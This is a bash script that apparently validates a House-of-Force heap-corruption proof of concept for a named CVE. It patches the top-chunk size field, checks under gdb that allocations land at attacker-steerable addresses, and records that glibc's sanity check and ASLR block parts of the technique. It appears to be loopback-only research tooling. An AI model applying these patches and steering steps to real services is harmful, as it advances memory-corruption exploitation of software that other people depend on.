#!/usr/bin/env bash
# Bounded House-of-Force steering probe for CVE-2026-103501. Loopback only:
# every service binds 127.0.0.1 and the driver dials only that port.
# Extends the witness-confirmed run_all.sh (which is left unchanged).
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
OUT=$(cd "$OUT" && pwd)
BIN="$OUT/hoosf_plain"
SEED="$OUT/seed.bin"
# Top size 0x1f000 little-endian at coupon-relative bytes 40..47.
PATCH=40=00,41=f0,42=01,43=00,44=00,45=00,46=00,47=00
pass=0; fail=0
check() {
  if [ "$2" -eq 1 ]; then echo "PASS $1"; pass=$((pass + 1));
  else echo "FAIL $1"; fail=$((fail + 1)); fi
}
val() { grep -o "$1=[^ ]*" "$2" | head -1 | cut -d= -f2; }

# 1. Plausible top size accepted; first malloc lands at top+16 with attacker
#    bytes; second malloc lands at top+16+chunksize(s1), s1=0x1000 -> +0x1010.
python3 "$HERE/drive.py" --bin "$BIN" --port 38151 --count 64 --value 90 \
  --seed "$SEED" --extra-argv 0x1000,0x40 --gdb-script "$HERE/gdb_hoosf.gdb" \
  --patch "$PATCH" > "$OUT/hoosf_gdb.log" 2>&1
L="$OUT/hoosf_gdb.log"
TOP=$(val GDB_TOP_ADDR "$L"); A1=$(val HOOSF_A1 "$L"); A2=$(val HOOSF_A2 "$L")
ok=0
if [ -n "$TOP" ] && [ -n "$A1" ] && [ -n "$A2" ] && \
   [ "$((A1))" -eq "$((TOP + 16))" ] && [ "$((A2))" -eq "$((A1 + 0x1010))" ] && \
   grep -q 'GDB_TOP_SIZE_BEFORE=0xdbd1' "$L" && \
   grep -q 'HOOSF_A1_BYTES=5a5a5a5a5a5a5a5a' "$L"; then ok=1; fi
check "patched top accepted; A1=top+16 holds 0x5a payload; A2=A1+0x1010" "$ok"

# 2. Steering: doubling s1 to 0x2000 shifts A2 by exactly 0x1000.
python3 "$HERE/drive.py" --bin "$BIN" --port 38152 --count 64 --value 90 \
  --seed "$SEED" --extra-argv 0x2000,0x40 --gdb-script "$HERE/gdb_hoosf.gdb" \
  --patch "$PATCH" > "$OUT/hoosf_steer.log" 2>&1
A2B=$(val HOOSF_A2 "$OUT/hoosf_steer.log")
ok=0
if [ -n "$A2B" ] && [ "$((A2B))" -eq "$((A2 + 0x1000))" ]; then ok=1; fi
check "s1 0x1000->0x2000 steers A2 by exactly +0x1000" "$ok"

# 3. Wraparound top size -1 is rejected by glibc: no arbitrary negative steer.
python3 "$HERE/drive.py" --bin "$BIN" --port 38153 --count 64 --value 90 \
  --seed "$SEED" --extra-argv 0x1000,0x40 \
  --patch 40=ff,41=ff,42=ff,43=ff,44=ff,45=ff,46=ff,47=ff \
  > "$OUT/hoosf_neg_one.log" 2>&1
ok=0
if grep -q 'malloc(): corrupted top size' "$OUT/hoosf_neg_one.log" && \
   grep -q 'service_rc=-6' "$OUT/hoosf_neg_one.log"; then ok=1; fi
check "top size -1 wraparound rejected: malloc(): corrupted top size" "$ok"

# 4. ASLR randomises the absolute heap address: two plain runs differ.
python3 "$HERE/drive.py" --bin "$BIN" --port 38154 --count 64 --value 90 \
  --seed "$SEED" --extra-argv 0x1000,0x40 --patch "$PATCH" \
  > "$OUT/hoosf_aslr_a.log" 2>&1
python3 "$HERE/drive.py" --bin "$BIN" --port 38155 --count 64 --value 90 \
  --seed "$SEED" --extra-argv 0x1000,0x40 --patch "$PATCH" \
  > "$OUT/hoosf_aslr_b.log" 2>&1
A1A=$(val HOOSF_A1 "$OUT/hoosf_aslr_a.log")
A1B=$(val HOOSF_A1 "$OUT/hoosf_aslr_b.log")
ok=0
if [ -n "$A1A" ] && [ -n "$A1B" ] && [ "$A1A" != "$A1B" ]; then ok=1; fi
check "ASLR: absolute A1 differs across two plain runs (needs a leak)" "$ok"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL_CHECKS_PASS"; exit 0; }
echo "SOME_CHECKS_FAILED"; exit 1
